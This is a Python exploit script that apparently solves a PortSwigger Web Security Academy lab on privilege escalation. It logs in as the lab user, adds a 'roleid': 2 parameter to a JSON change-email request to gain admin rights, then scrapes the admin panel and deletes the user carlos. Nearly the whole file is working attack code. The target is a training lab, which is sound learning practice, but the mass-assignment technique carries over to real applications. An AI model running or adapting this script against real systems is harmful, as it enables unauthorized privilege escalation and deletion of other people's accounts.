import requests
from bs4 import BeautifulSoup

# === SETUP ===
site = "0a1f00450430d8b0811c256c00860026.web-security-academy.net"  # Replace if new lab instance
s = requests.Session()

# === STEP 1: Login as Wiener ===
login_url = f"https://{site}/login"
login_data = {
    'username': 'wiener',
    'password': 'peter'
}
s.post(login_url, data=login_data)

# === STEP 2: Attempt role escalation via JSON manipulation ===
change_email_url = f"https://{site}/my-account/change-email"
json_payload = {
    'email': 'calizo@pdx.edu',
    'roleid': 2  # Malicious parameter to elevate user privileges
}
resp = s.post(change_email_url, json=json_payload, allow_redirects=False)

print(f"[i] Change email response: {resp.status_code}")
print(resp.text)

# === STEP 3: If role escalation works, access admin panel and delete Carlos ===
admin_url = f"https://{site}/admin"
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')

delete_link = [link.get('href') for link in soup.find_all('a') if 'carlos' in str(link)]

if delete_link:
    delete_url = f"https://{site}{delete_link[0]}"
    confirm = s.get(delete_url)
    if "Congratulations" in confirm.text:
        print("[✓] Successfully deleted carlos and completed the lab.")
    else:
        print("[!] Delete request failed.")
else:
    print("[!] Could not find carlos delete link.")
